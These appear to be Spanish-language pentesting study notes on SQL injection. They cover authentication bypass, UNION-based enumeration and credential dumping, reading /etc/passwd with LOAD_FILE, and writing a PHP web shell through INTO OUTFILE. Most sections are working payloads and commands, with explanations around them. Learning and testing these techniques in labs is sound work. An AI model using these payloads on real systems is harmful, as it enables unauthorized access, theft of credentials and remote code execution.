# 1. ¿Qué es una SLQi?

> En la mayoría de webs, existe una base de datos para almacenar contenido dinámico e información de los usuarios (hoteles, comentarios, posts, usuarios y contraseñas para la autenticación...). La base de datos puede que esté en el mismo servidor (arquitectura monolítica) o en otro (servicios distrbuidos). 

El código backend se autentica y conecta a la base de datos y envía consultas en tiempo real para obtener ese contenido que necesita la web. Por ejemplo mediante `PHP`:
```php
$conn = new mysqli("localhost", "root", "password", "users"); 
$query = "select * from logins"; $result = $conn->query($query);

// imrpime s todos los resultados devueltos de la consulta SQL
while($row = $result->fetch_assoc() ){ echo $row["name"]."<br>"; }
```

Las aplicaciones web también suelen usar la entrada del usuario (user-input) al recuperar datos. 
```php
// Por ejemplo, una funcionalidad para buscar usuarios por POST 🡆 "findUser=usuario"
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

---
## 1.1. La SQLi

> [!CAUTION]
> Cuando se usa input del usuario para construir la consulta SQL y no se sanitiza ni filtra del todo bien dicha entrada, pueden acontecerse inyeccions SQL (`SQLi`) ya que se interpreta la entrada como código a ejecutar en lugar de como cadena. Estas son consultas maliciosas que permiten realizar acciones distintas de las previstas por los desarolladores de la web. **Esta vulnerabilidad no reside en la base de datos, sino en el código backend del servidor web.**

Las SQLi permiten al atacante
- Saltarse validaciones subvertiendo la lógica de la consulta original 
- Realizar consultas a datos sensibles/secretos añadiendo una consulta completamente nueva
- Leer o escribir archivos directamente en el servidor back-end
- Ejecutar comandos en el servidos (en MSSQL)

---
## 1.2. Tipos de SQLi

Existen estos tipos de inyecciones:
```c
                                        SQLI
                                          │
          ┌───────────────────────────────┼─────────────┐
         In band                         Blind         Out-Of-Band (OOB)
          │                               │
    ┌─────┴─────┐            ┌────────────┴─────┐   
  Union Based  Error based  Boolean Based   Time Based

```


| Tipo    | Diferencia                                    | Subtipos                                                                               |
| ------- | --------------------------------------------- | -------------------------------------------------------------------------------------- |
| In band | La salida se refleja en la web                | Union Based (basada en `UNION`) y Error Based (basada en errores).                     |
| Blind   | La salida se refleja de manera indirecta      | Boolean Based (basada en condicionales) y Time Based (basada en tiempo con `sleep()`). |
| OOB     | La salida va a un registro remoto (invisible) | Por ejemplo la salida va a errores DNS                                                 |


---
# 2. SQLI normal

## 2.1. Escapar del contexto

La comilla simple (`'`) o doble se utiliza para cerrar la entrada del usuario  (`"`). Pero si el atacante la cierra, podrá añadir más código y luego dejarla abierta otra vez para que el backend la vuelva a cerrar.

> [!TIP]
> Para tener una inyección exitosa, debemos asegurarnos de que la consulta SQL recién modificada siga siendo válida y no tenga errores de sintaxis después de nuestra inyección.

```sql
-- Digamos que el backend utiliza esta query
select * from logins where username like '+<input_usuario>+';

-- El atacante introduce esto, dejando la query abierta para que el backend la cierre con ';
1'; DROP TABLE users;'

-- Que se interpreta como esto:
select * from logins where username like '1'; DROP TABLE users;'';
```

Casi nunca sabemos cómo está escrito el código backend y por tanto no sabemos cómo se trata nuestro input ni que consulta se hace realmente. **Por tanto lo que hay que hacer es provocar un error de sintaxis porque habremos dejado una query abierta**

------
####  Fuzzing de SQLi
Podemos tratar de fuzzear el caracter que nos provoque el error sql, por ejemplo en un parámetro `POST` 
```bash
ffuf -request request.txt -request-proto https -w ../sqli.auth.bypass.txt
```

Los diccionarios son estos:

| Uso                     | Diccionario                                                    |
| ----------------------- | -------------------------------------------------------------- |
| Bypass de autenticación | `secLists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt`         |
| Errores SQL             | `secLists/Fuzzing/Databases/SQLi/quick-SQLi.txt`               |
| Blind SQLi              | `secLists/Fuzzing/Databases/SQLi/Generic-BlindSQLi.fuzzdb.txt` |
| Inyecciones variadas    | `secLists/Fuzzing/Databases/SQLi/Generic-SQLi.txt`             |
| Provocar errores        | `secLists/Fuzzing/special-chars.txt`                           |


---
## 2.2. Bypass de autenticación

Podemos modificar la consulta original inyectando el operador `OR` y usando comentarios SQL para subvertir la lógica de la consulta. 

Un ejemplo básico de esto es eludir la autenticación web, dónde nuestro input que hemos enviado por el formulario `username=<input>&password=<input>` se introduce en una query como esta.
```sql
SELECT * FROM logins WHERE username='+<username>+' AND password = '+<password>+';
```

La página recibe las credenciales y las mete en una condición `AND`, dónde si el nombre y la contraseña coinciden ambos con un registro de la base de datos, la sentencia será válida y el código backend devolverá un `true`, validando el inicio del sesión. Si las credenciales son incorrectas, devolverá en cambio un `false`. 

---
#### Provocar un error
Antes de hacer la consulta, hay que probar con diferentes caracteres para ver si hay un error. El error lo provocaremos al dejar la query abierta poniendo, en este caso usando la `'`
```sql
SELECT * FROM logins WHERE username=' + ' + ' AND password = '<password>';
```

Obviamente a veces se cierra con otra cosa, como no sabemos como está escrito el código, debemos probar otros caracteres como `"`, `')`. `")`, `;` o `*` . Si no hay error con ninguno puede que sea una `blind sqli`.

> Si la consulta es por `GET` habrá que urlencodear el caracter

Haciendo fuzzing vemos que con la comilla simple da un resultado diferente
```bash
$: ffuf -request request -request-proto http -w ./special-chars.txt
#"                       [Status: 200, Size: 1139, Words: 180, Lines: 38, Duration: 30ms]
#'                       [Status: 200, Size: 507, Words: 75, Lines: 17, Duration: 31ms]
#)                       [Status: 200, Size: 1139, Words: 180, Lines: 38, Duration: 31ms]
##                       [Status: 200, Size: 1139, Words: 180, Lines: 38, Duration: 31ms]
```


---
#### Subvertir la lógica
Por tanto. ¿Cómo podemos hacer que la sentencia sea verdadera aunque no sepamos la contraseña? Aprovechandonos del primer campo (`username`) y creando una query abusando de `OR` y una sentencia válida. Primero se evalua el operador `AND` y luuego el `OR`

```sql
-- El atacante introduce esto
admin' or '1'='1

-- Quedaría la query final como
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'xd';
-- [true] OR ([true] AND [false]) 🡆 [true] OR [false] 🡆 TRUE
```

Por lo tanto, la consulta devolverá `True` si existe un nombre de usuario `'admin'`, eludiendo la autenticación.

Otra manera es mediante los **comentarios**
```sql
admin'--

'-- Quedaría la query final como
SELECT * FROM logins WHERE username='admin'--' AND password = 'xd';
```

Puede que haya paréntesis `()` lo que significa que la clausula se valida antes que otra. Para escapar de los parentesis debemos usar comilla simple/doble y parentesis como por ejemplo `admin')--` o  `') OR '1'=1-- -`. 
```sql
SELECT * FROM logins WHERE (username='+<username>+' AND id > 1)  AND password = '+<pass>+';

SELECT * FROM logins WHERE (username=' admin')-- ' AND id > 1)  AND password = 'pass';
```

> [!INFO]
> **Ejercicio**: Login como el quinto usuario 🡆 `' OR id =5)-- -`  🡆 Query final  `(username='' OR id =5)-- -`


---
## 2.3. Union Based

> [!NOTE]
> La operación `UNION` permite mostrar los resultados de dos tablas en una, bajo la condición de que se **seleccionen el mismo número de columnas en ambas y con datos del mismo tipo**

Los nombres de las columnas serán los de la primera tabla.
```sql
mysql> SELECT title, year FROM movies UNION SELECT products, price FROM shop;

+--------------------------+-----------+
| title                    | year      |
+--------------------------+-----------+
| Star Wars episode II     | 2002      |
| Harry Potter chapter IV  | 2005      |
| Chocolate "Wonka"        | 5         |
+--------------------------+-----------+
3 rows in set (0.00 sec)
```

Por tanto con `UNION` podemos añadir una segunda consulta a la tabla que nos interese

Si queremos ver un número de columnas inferior a la primera tabla, hay que rellenar con `junk data` el resto de columnas. Además como el tipo de datos tiene que coincidir para ambas tablas, podemos usar el comodín de `NULL` como junk, que vale para todos.
```
mysql> SELECT title, year, director FROM movies UNION SELECT user, pass, NULL FROM users;
```

Si en cambio el número de columnas tiene que ser superior a la otra tabla, podemos usar la operación `GROUP_CONCAT()` para meter dos columnas en el espacio de una.

---
#### Ver el número de columnas
Antes de realizar la operatoria, tenemos que ver el número de columnas que se han seleccionado y su orden. Para ello, usaremos números como junk data. 
```bash
test' UNION select 1,2-- -        '# Da un error de número de columnas inválido
test' UNION select 1,2,3-- -      '# Muestra las columnas 2 y 3
```

No nos podemos fiar de que en la web salga una tabla con 3 columnas, porque a lo mejor se ha seleccionado otra que no se muestra en el frontend. Por ejemplo la columna `ID` no se suele mostrar. 

Este es el beneficio de usar números como nuestros datos de relleno, ya que facilita el seguimiento de qué columnas se imprimen, para que sepamos en qué columna colocar nuestra consulta.

Ahora en cualquiera de esas columnas, se pondrá el dato que queremos ver, como por ejemolo ¿Cómo se llama la base de datos actual?
```sql
test' UNION select 1,2,database(),4-- -
```

---
#### Fingerprintint de DBMS
Antes de enumerar la base de datos, normalmente necesitamos identificar el tipo de DBMS (Sistema de gestión de bases de datos) con el que estamos tratando. Esto se debe a que cada DBMS tiene consultas diferentes, y saber cuál es nos ayudará a saber qué consultas usar.

Como suposición inicial, si el servidor web que vemos en las respuestas HTTP es `Apache` o `Nginx`, puede ser que el servidor web se está ejecutando en Linux, por lo que es probable que el DBMS sea `MySQL` y si es un `IIS` lo normal esque sea `MSSQL`. Aun así esta relga no es exacta, por lo que tendremos que identificar el DMBS que se está utilizando.

Las siguientes consultas y sus resultados nos dirán que estamos tratando con `MySQL`:

| Payload     | Cuándo usar                                      | Salida esperada                                                  | Salida incorrecta                                            |
| ----------- | ------------------------------------------------ | ---------------------------------------------------------------- | ------------------------------------------------------------ |
| `@@version` | Cuando tenemos la salida completa de la consulta | Versión de MySQL (p. ej., `10.3.22-MariaDB-1ubuntu1`)            | En MSSQL devuelve la versión de MSSQL. Error con otros DBMS. |
| `POW(1,1)`  | Cuando solo tenemos una salida numérica          | `1`                                                              | Error con otros DBMS                                         |
| `SLEEP(5)`  | Ciega/Sin salida                                 | Retrasa la respuesta de la página por 5 segundos y devuelve `0`. | No retrasará la respuesta con otros DBMS                     |

La salida `10.3.22-MariaDB-1ubuntu1` significa que estamos tratando con un DBMS `MariaDB`, similar a MySQL. Dado que tenemos una salida directa de la consulta, no tendremos que probar los otros payloads. 

---
#### Acceder a los datos
Para extraer datos de las tablas usando `UNION SELECT`, necesitamos formar nuestras consultas `SELECT` correctamente. Para hacerlo, necesitamos listar las bases de datos, las tablas de la base de datos que nos interese y las columnas de la tabla que queramos volcar. Para ello, utilizaremos la base de datos `INFORMATION_SCHEMA`.

> [!TIP]
> La base de datos `INFORMATION_SCHEMA`  contiene metadatos sobre las bases de datos y tablas presentes en el servidor. Como esta es una base de datos diferente, no podemos llamar a sus tablas directamente con una sentencia `SELECT` ya que las buscará dentro de la misma base de datos, así que referenciaremos a las tablas de otra base de datos con la sintaxis `db.tabla`

Dentro de `INFORMATION_SCHEMA` tenemos estas tablas:
- `SCHEMATA` contiene información de las bases de datos del servidor. 
	- La columa `SCHEMA_NAME` contiene sus nombres
- La tabla `TABLES` contiene información de las tablas de cada base de datos.  
	- La columna `TABLE_NAME` almacena los nombres de las tablas, 
	- La columna `TABLE_SCHEMA` apunta a la base de datos a la que pertenece cada tabla.
- La tabla `COLUMNs` contiene todas las columnas de las bases de datos del servidor. 
	- Las columna `COLUMN_NAME` tiene los nombres de las columnas 
	- `TABLE_NAME` y `TABLE_SCHEMA` permiten apuntar a la tabla y base de datos que nos interesa

Por tanto procedemos con la enumeración:
```sql
-- Las bases de datos
UNION select 1,schema_name,3 from INFORMATION_SCHEMA.SCHEMATA-- -    
-- # users

-- Las tablas de la base de datos que queremos
UNION select 1,TABLE_NAME,3 from INFORMATION_SCHEMA.TABLES where table_schema='users'-- -
-- # creds

UNION select 1,COLUMN_NAME,3 from INFORMATION_SCHEMA.COLUMNS where table_name='creds'-- -
-- # user y pass

-- Exfiltrar los datos
UNION select 1, username, password from users.creds-- -
```

¿Y si solo tenemos una columna? Ahí debemos usar el operador `GROUP_CONCAT`
```sql
UNION select 1, GROUP_CONCAT(username,0x3a,password) from users.creds-- -
-- admin:pass123!
```

> [!WARNING]
> Para el resto de bases de datos podemos usar otros payloads como los listados en [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---
#### Leer archivos
Para leer archivos debemos saber nuestro usaurio y si cuenta con privilegios para ello.
```sql
-- Saber nuestro usuario
UNION select 1,CURRENT_USER(), 3-- -
-- # root@localhost

-- Ver nuestros privilegios
UNION SELECT 1, grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Si sale el privilegio `FILE` significa que podemos leer archivos. Para ello usaremos `LOAD_FILE()` con la ruta del archivo al que queramos acceder, ya sea del sistema o del propio código fuente de la aplicación:
```sql
UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3-- -
UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3-- -
```


---
#### Escribir archivos
Para poder escribir archivos en el servidor _back-end_ utilizando una base de datos MySQL, necesitamos tres cosas:
1. Usuario con el privilegio `FILE` habilitado
2. Variable global `secure_file_priv` de MySQL no habilitada
3. Acceso de escritura a la ubicación en la que queremos escribir en el servidor _back-end_

Ya hemos descubierto que nuestro usuario actual tiene el privilegio `FILE` necesario para escribir archivos. 

> [!NOTE]
>  La variable global `secure_file_priv`  determina si MYSQL puede leer o escribir archivos. Puede tener uno de estos 3 valores
> - Un valor vacío nos permite leer archivos de todo el sistema de archivos. 
> - Si se establece un directorio determinado, solo podemos leer desde la carpeta especificada por la variable. 
> - `NULL` (vacío) significa que no podemos leer/escribir desde ningún directorio (Por defecto)

En `INFORMATION_SCHEMA` existe la tabla `global_variables` con las columnas `variable_name` y `variable_value`.
```sql
UNION SELECT 1,variable_name, variable_value FROM INFORMATION_SCHEMA.global_variables 
WHERE variable_name="secure_file_priv"`
```

La sentencia `SELECT .. INTO OUTFILE` permite escribir datos de consultas en archivos. Esto se usa generalmente para exportar datos de tablas.
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials'; -- con el resultado de select

SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt'; -- - con cadenas de texto

SELECT FROM_BASE64("base64_data") INTO OUTFILE '/tmp/test.txt'; -- - con texto largo
```

> [!TIP]
> Para escribir una `web shell`, debemos conocer el directorio web base del servidor web (`web root`). Para ello podemos tratar de leer el archivo de configuración del servidor (Ej `/etc/apache2/apache2.conf`), buscar en línea posibles ubicaciones de configuración, usar fuzzing o provocar errores

El _payload_ de la inyección `UNION` sería el siguiente (importante, hay que quitar los números):
```SQL
UNION SELECT "",'file written successfully!',"" into outfile '/var/www/html/proof.txt'-- -

UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "" into outfile '/var/www/html/shell.php'-- -
```

